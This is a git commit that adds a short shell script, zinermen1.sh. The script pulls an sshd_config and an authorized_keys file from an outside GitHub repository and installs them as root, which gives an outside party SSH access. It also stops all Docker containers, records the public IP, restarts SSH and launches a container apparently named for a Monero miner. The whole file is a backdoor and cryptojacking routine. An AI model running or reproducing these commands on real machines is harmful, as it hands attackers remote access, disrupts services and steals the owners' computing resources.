ec98c374bc7bc1b893687de59e8f58135449ca69
biglose3 <45776923+biglose3@users.noreply.github.com>
2018-12-11 02:53:15 +0100

    Create zinermen1.sh

---
+++ zinermen1.sh
@@ -0,0 +1,10 @@
+wget  https://raw.githubusercontent.com/zawal101/shi/master/sshd_config
+sudo  cp sshd_config /etc/ssh/ 
+sudo mkdir /root/.ssh/ 
+wget  https://raw.githubusercontent.com/zawal101/shi/master/authorized_keys 
+sudo cp authorized_keys  ~/.ssh/authorized_keys 
+docker stop  $(docker ps -aq)   
+curl ipinfo.io/ip 
+docker stop  $(docker ps -aq) 
+service ssh restart 
+docker run -t -i -d -m 52M  m3mone3o/m3m0ner0
